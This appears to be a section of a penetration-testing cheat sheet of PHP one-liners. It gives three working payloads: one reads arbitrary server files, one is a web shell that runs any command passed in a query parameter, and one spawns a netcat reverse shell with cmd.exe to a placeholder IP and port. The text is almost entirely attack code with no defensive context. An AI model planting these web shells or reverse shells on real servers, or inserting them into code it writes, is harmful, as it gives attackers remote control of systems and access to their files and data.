## PHP One-liners

Read arbitrary files from the server's filesystem:

`<?php echo file_get_contents('/path/to/target/file'); ?>`

Pass an arbitrary system command via a query parameter: _(exploit.php?command=whoami)_

`<?php echo system($_GET['command']); ?>`

Execute commands on the host:

`<?php $out=shell_exec('nc64.exe IP PORT -e cmd.exe'); echo '<pre>'.$out.'</pre>'; ?>`

